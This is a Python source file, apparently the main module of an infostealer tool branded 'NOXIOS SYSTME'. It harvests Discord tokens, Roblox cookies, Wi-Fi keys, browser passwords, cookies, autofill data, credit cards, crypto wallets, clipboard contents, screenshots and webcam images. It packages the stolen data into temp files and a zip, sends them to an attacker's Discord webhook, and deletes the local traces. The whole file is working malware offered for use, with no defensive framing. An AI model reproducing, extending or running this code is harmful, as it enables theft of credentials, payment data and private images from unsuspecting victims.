import os
import sys
import time
import tempfile
import zipfile
from datetime import datetime
from config import WEBHOOK_URL
from core_functions import get_system_info, take_screenshot, capture_webcam
from discord_grabber import get_discord_tokens_complete
from roblox_grabber import get_roblox_app_cookie
from wifi_grabber import get_wifi_passwords
from webhook_sender import send_to_webhook, send_embed

try:
    from browser_grabber import get_passwords, get_cookies, get_history, get_autofill, get_credit_cards, get_bookmarks
except Exception:
    def get_passwords(): return []
    def get_cookies(): return []
    def get_history(limit=200): return []
    def get_autofill(): return []
    def get_credit_cards(): return []
    def get_bookmarks(limit=200): return []

try:
    from email_grabber import get_all_emails
except:
    def get_all_emails(*a, **kw): return []

try:
    from clipboard_grabber import get_clipboard_text
except:
    def get_clipboard_text(): return None

try:
    from system_extended import get_extended_system_info, get_startup_apps
except:
    def get_extended_system_info(): return {}
    def get_startup_apps(): return []

try:
    from files_grabber import collect_interesting_files, zip_collected_files, steal_wallets
except:
    def collect_interesting_files(*a, **kw): return None
    def zip_collected_files(*a, **kw): return None
    def steal_wallets(): return []

def _write_temp_txt(filename, content):
    try:
        path = os.path.join(tempfile.gettempdir(), filename)
        with open(path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(content)
        return path
    except:
        return None

def main():
    print("NOXIOS SYSTME | @nscsp12 - Processing...")

    sys_info = get_system_info()
    tokens = get_discord_tokens_complete()
    roblox_data = get_roblox_app_cookie()
    wifi = get_wifi_passwords()

    print("Collecting browser data...")
    try:
        passwords = get_passwords()
    except:
        passwords = []
    try:
        cookies = get_cookies()
    except:
        cookies = []
    try:
        history = get_history(limit=150)
    except:
        history = []
    try:
        autofill = get_autofill()
    except:
        autofill = []
    try:
        credit_cards = get_credit_cards()
    except:
        credit_cards = []
    try:
        bookmarks = get_bookmarks(limit=100)
    except:
        bookmarks = []

    try:
        emails = get_all_emails(autofill_data=autofill, passwords=passwords, cookies=cookies, scan_files=False)
    except:
        emails = []

    try:
        clipboard = get_clipboard_text()
    except:
        clipboard = None

    try:
        ext_sys = get_extended_system_info()
    except:
        ext_sys = {}
    try:
        startup = get_startup_apps()
    except:
        startup = []
    try:
        wallets = steal_wallets()
    except:
        wallets = []

    fields = []
    sys_text = f"""Hostname: {sys_info['hostname']}
User: {sys_info['user']}
IP: {sys_info['ip']}
Location: {sys_info['location']}
OS: {sys_info['os']}
Admin: {sys_info['admin']}
Cores: {ext_sys.get('cores_logical','?')} ({ext_sys.get('cores_physical','?')} phys)
RAM: {ext_sys.get('ram_total_gb','?')}GB
GPU: {ext_sys.get('gpu','?')[:60]}
Res: {ext_sys.get('screen_res','?')}
Uptime: {ext_sys.get('uptime','?')}"""
    fields.append({'name': 'System Information', 'value': f'```\n{sys_text}\n```', 'inline': False})

    if tokens:
        token_text = '\n'.join(tokens[:10])
        if len(tokens) > 10:
            token_text += f'\n... and {len(tokens) - 10} more'
        fields.append({'name': f'Discord Tokens ({len(tokens)})', 'value': f'```\n{token_text}\n```', 'inline': False})
    else:
        fields.append({'name': 'Discord Tokens', 'value': '```\nNone found\n```', 'inline': False})

    if roblox_data:
        if isinstance(roblox_data, dict) and 'cookie' in roblox_data:
            roblox_text = f"User ID: {roblox_data.get('user_id', 'Unknown')}\nCookie: {roblox_data['cookie'][:300]}"
        else:
            roblox_text = str(roblox_data)[:800]
        fields.append({'name': 'Roblox Cookie', 'value': f'```\n{roblox_text}\n```', 'inline': False})
    else:
        fields.append({'name': 'Roblox Cookie', 'value': '```\nNot found\n```', 'inline': False})

    if wifi:
        wifi_text = '\n'.join([f"{w['ssid']}: {w['password']}" for w in wifi[:15]])
        if len(wifi) > 15:
            wifi_text += f'\n... and {len(wifi) - 15} more'
        fields.append({'name': f'Wi-Fi Networks ({len(wifi)})', 'value': f'```\n{wifi_text}\n```', 'inline': False})
    else:
        fields.append({'name': 'Wi-Fi Networks', 'value': '```\nNone found\n```', 'inline': False})

    fields.append({'name': f'Passwords ({len(passwords)})', 'value': f'```\nFound {len(passwords)} saved passwords\nBrowsers: {", ".join(sorted(set(p["browser"] for p in passwords)) ) if passwords else "None"}\n```', 'inline': True})
    fields.append({'name': f'Cookies ({len(cookies)})', 'value': f'```\nFound {len(cookies)} cookies\n```', 'inline': True})
    fields.append({'name': f'Emails ({len(emails)})', 'value': f'```\n{chr(10).join(emails[:10]) if emails else "None"}\n{f"... and {len(emails)-10} more" if len(emails)>10 else ""}\n```', 'inline': False})
    fields.append({'name': f'History ({len(history)})', 'value': f'```\n{len(history)} URLs collected\n```', 'inline': True})
    fields.append({'name': f'Autofill ({len(autofill)})', 'value': f'```\n{len(autofill)} entries\n```', 'inline': True})
    fields.append({'name': f'Credit Cards ({len(credit_cards)})', 'value': f'```\n{len(credit_cards)} cards\n```', 'inline': True})
    if credit_cards:
        cc_preview = "\n".join([f"{c['browser']} {c['name']} {c['number'][:6]}**** exp {c['exp_month']}/{c['exp_year']}" for c in credit_cards[:3]])
        fields.append({'name': 'CC Preview', 'value': f'```\n{cc_preview}\n```', 'inline': False})
    fields.append({'name': f'Bookmarks ({len(bookmarks)})', 'value': f'```\n{len(bookmarks)} bookmarks\n```', 'inline': True})
    if clipboard:
        clip_preview = clipboard[:500].replace('`','')
        fields.append({'name': 'Clipboard', 'value': f'```\n{clip_preview}\n```', 'inline': False})
    if wallets:
        fields.append({'name': f'Wallets ({len(wallets)})', 'value': f'```\n{chr(10).join(wallets[:10])}\n```', 'inline': False})
    if startup:
        fields.append({'name': f'Startup Apps ({len(startup)})', 'value': f'```\n{chr(10).join(startup[:8])}\n```', 'inline': False})

    send_embed('NOXIOS SYSTME | @nscsp12', fields)

    temp_files = []
    zip_path = None
    try:
        if passwords:
            content = "BROWSER PASSWORDS - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for p in passwords[:500]:
                content += f"Browser: {p['browser']} | Profile: {p['profile']}\nURL: {p['url']}\nUser: {p['username']}\nPass: {p['password']}\n{'-'*60}\n"
            fp = _write_temp_txt("passwords.txt", content)
            if fp: temp_files.append(fp)

        if cookies:
            content = "BROWSER COOKIES - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for c in cookies[:800]:
                content += f"{c['browser']} | {c['host']} | {c['name']} = {c['value'][:200]}\n"
            fp = _write_temp_txt("cookies.txt", content)
            if fp: temp_files.append(fp)
            try:
                netscape = "# Netscape HTTP Cookie File\n"
                for c in cookies[:500]:
                    netscape += f"{c['host']}\tTRUE\t{c['path']}\tFALSE\t{c['expires']}\t{c['name']}\t{c['value']}\n"
                fp2 = _write_temp_txt("cookies_netscape.txt", netscape)
                if fp2: temp_files.append(fp2)
            except:
                pass

        if emails:
            content = "EMAILS FOUND - NOXIOUS SQUAD\n" + "="*40 + "\n" + "\n".join(emails)
            fp = _write_temp_txt("emails.txt", content)
            if fp: temp_files.append(fp)

        if history:
            content = "BROWSER HISTORY - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for h in history[:300]:
                content += f"[{h['browser']}] {h['title'][:80]} - {h['url']}\n"
            fp = _write_temp_txt("history.txt", content)
            if fp: temp_files.append(fp)

        if autofill:
            content = "AUTOFILL DATA - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for a in autofill[:300]:
                content += f"[{a['browser']}] {a['type']}: {a['data'][:200]}\n"
            fp = _write_temp_txt("autofill.txt", content)
            if fp: temp_files.append(fp)

        if credit_cards:
            content = "CREDIT CARDS - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for cc in credit_cards:
                content += f"Browser: {cc['browser']}\nName: {cc['name']}\nNumber: {cc['number']}\nExp: {cc['exp_month']}/{cc['exp_year']}\n{'-'*40}\n"
            fp = _write_temp_txt("credit_cards.txt", content)
            if fp: temp_files.append(fp)

        if bookmarks:
            content = "BOOKMARKS - NOXIOUS SQUAD\n" + "="*60 + "\n"
            for b in bookmarks[:200]:
                content += f"[{b['browser']}] {b['name']} - {b['url']}\n"
            fp = _write_temp_txt("bookmarks.txt", content)
            if fp: temp_files.append(fp)

        if clipboard:
            fp = _write_temp_txt("clipboard.txt", f"CLIPBOARD - NOXIOUS SQUAD\n{'='*40}\n{clipboard}")
            if fp: temp_files.append(fp)

        if ext_sys or startup:
            content = f"EXTENDED SYSTEM INFO\n{'='*60}\n"
            for k,v in ext_sys.items():
                content += f"{k}: {v}\n"
            if startup:
                content += f"\nSTARTUP APPS:\n" + "\n".join(startup)
            if wallets:
                content += f"\n\nWALLETS:\n" + "\n".join(wallets)
            fp = _write_temp_txt("system_extended.txt", content)
            if fp: temp_files.append(fp)

        if len(temp_files) >= 3:
            zip_path = os.path.join(tempfile.gettempdir(), "NOXIOUS SQUAD_data.zip")
            try:
                with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
                    for f in temp_files:
                        if os.path.exists(f):
                            z.write(f, arcname=os.path.basename(f))
                send_to_webhook("**NOXIOS SYSTME | @nscsp12- Full Data Dump (includes passwords, cookies, emails, history, autofill, CC)**", zip_path)
                for f in temp_files:
                    try:
                        os.remove(f)
                    except:
                        pass
                try:
                    os.remove(zip_path)
                except:
                    pass
                temp_files = []
                zip_path = None
            except:
                pass

        for fp in temp_files:
            try:
                if os.path.exists(fp) and os.path.getsize(fp) < 7*1024*1024:
                    send_to_webhook(f"**{os.path.basename(fp)}**", fp)
                    time.sleep(0.5)
                    os.remove(fp)
            except:
                continue
        if zip_path and os.path.exists(zip_path):
            try:
                os.remove(zip_path)
            except:
                pass

    except Exception as e:
        print(f"Error creating report files: {e}")

    screenshot = take_screenshot()
    if screenshot:
        try:
            send_to_webhook("**Screenshot**", screenshot)
            os.remove(screenshot)
        except:
            pass
    webcam = capture_webcam()
    if webcam:
        try:
            send_to_webhook("**Webcam**", webcam)
            os.remove(webcam)
        except:
            pass
    print("Done. Check Discord.")

if __name__ == "__main__":
    if not WEBHOOK_URL or WEBHOOK_URL == "YOUR_WEBHOOK_HERE":
        print("Set WEBHOOK_URL in config.py")
    else:
        main()
